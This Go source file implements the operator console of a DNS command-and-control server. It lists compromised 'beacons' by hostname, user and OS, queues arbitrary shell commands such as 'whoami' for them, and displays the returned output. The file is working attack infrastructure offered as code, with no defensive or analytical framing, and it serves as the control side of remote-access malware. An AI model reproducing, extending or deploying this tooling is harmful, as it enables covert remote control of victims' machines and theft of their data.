package main

import (
	"bufio"
	"fmt"
	"os"
	"strings"
	"time"
)

// startC2Console starts an interactive console for C2 management
func startC2Console() {
	fmt.Println("\n=== DNS C2 Management Console ===")
	fmt.Println("Type 'help' for available commands")

	scanner := bufio.NewScanner(os.Stdin)

	for {
		fmt.Print("c2> ")

		if !scanner.Scan() {
			break
		}

		input := strings.TrimSpace(scanner.Text())
		if input == "" {
			continue
		}

		parts := strings.Fields(input)
		command := strings.ToLower(parts[0])

		switch command {
		case "help", "?":
			printC2Help()

		case "status", "st":
			c2Manager.PrintStatus()

		case "beacons", "list":
			listBeacons()

		case "tasks":
			listTasks()

		case "task", "cmd":
			if len(parts) < 3 {
				fmt.Println("Usage: task <beacon_id> <command>")
				continue
			}
			beaconID := parts[1]
			command := strings.Join(parts[2:], " ")
			taskID := c2Manager.AddTask(beaconID, command)
			if taskID != "" {
				fmt.Printf("Task %s queued for beacon %s\n", taskID, beaconID)
			} else {
				fmt.Printf("Failed to queue task (beacon %s not found)\n", beaconID)
			}

		case "result", "res":
			if len(parts) < 2 {
				fmt.Println("Usage: result <task_id>")
				continue
			}
			taskID := parts[1]
			showTaskResult(taskID)

		case "clear":
			// Clear screen (simple version)
			fmt.Print("\033[2J\033[H")

		case "exit", "quit":
			fmt.Println("Exiting C2 console...")
			time.Sleep(1 * time.Second)
			os.Exit(0)
			return

		default:
			fmt.Printf("Unknown command: %s (type 'help' for available commands)\n", command)
		}
	}
}

func printC2Help() {
	fmt.Print(`
Available Commands:
  help, ?              - Show this help menu
  status, st           - Show C2 server status
  beacons, list        - List all registered beacons
  tasks                - List all tasks and their status
  task <id> <cmd>      - Queue a command for a specific beacon
  result <task_id>     - Show result of a completed task
  clear                - Clear screen
  exit, quit           - Exit console

Examples:
  task a1b2 whoami
  task a1b2 dir C:\
  result T1001

`)
}

func listBeacons() {
	beacons := c2Manager.GetBeacons()

	if len(beacons) == 0 {
		fmt.Println("No beacons registered")
		return
	}

	fmt.Printf("\nRegistered Beacons (%d):\n", len(beacons))
	fmt.Printf("%-10s %-20s %-15s %-10s %-12s %-8s %s\n",
		"ID", "Hostname", "User", "OS", "Arch", "Queue", "Last Seen")
	fmt.Println(strings.Repeat("-", 95))

	for _, beacon := range beacons {
		fmt.Printf("%-10s %-20s %-15s %-10s %-12s %-8d %s\n",
			beacon.ID,
			truncateString(beacon.Hostname, 20),
			truncateString(beacon.Username, 15),
			beacon.OS,
			beacon.Arch,
			len(beacon.TaskQueue),
			beacon.LastSeen.Format("15:04:05"))
	}
	fmt.Println()
}

func listTasks() {
	tasks := c2Manager.GetTasks()

	if len(tasks) == 0 {
		fmt.Println("No tasks found")
		return
	}

	fmt.Printf("\nTasks (%d):\n", len(tasks))
	fmt.Printf("%-8s %-10s %-10s %-40s %s\n",
		"Task ID", "Beacon", "Status", "Command", "Created")
	fmt.Println(strings.Repeat("-", 85))

	for _, task := range tasks {
		fmt.Printf("%-8s %-10s %-10s %-40s %s\n",
			task.ID,
			task.BeaconID,
			task.Status,
			truncateString(task.Command, 40),
			task.CreatedAt.Format("15:04:05"))
	}
	fmt.Println()
}

func showTaskResult(taskID string) {
	tasks := c2Manager.GetTasks()
	task, exists := tasks[taskID]

	if !exists {
		fmt.Printf("Task %s not found\n", taskID)
		return
	}

	fmt.Printf("\nTask %s Details:\n", taskID)
	fmt.Printf("  Beacon ID: %s\n", task.BeaconID)
	fmt.Printf("  Command:   %s\n", task.Command)
	fmt.Printf("  Status:    %s\n", task.Status)
	fmt.Printf("  Created:   %s\n", task.CreatedAt.Format("2006-01-02 15:04:05"))

	if task.SentAt != nil {
		fmt.Printf("  Sent:      %s\n", task.SentAt.Format("2006-01-02 15:04:05"))
	}

	if task.Result != "" {
		fmt.Printf("  Result (%d chars):\n", len(task.Result))
		fmt.Println(strings.Repeat("-", 50))
		fmt.Println(task.Result)
		fmt.Println(strings.Repeat("-", 50))
	} else {
		fmt.Println("  Result: (no result yet)")
	}
	fmt.Println()
}

func truncateString(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen-3] + "..."
}
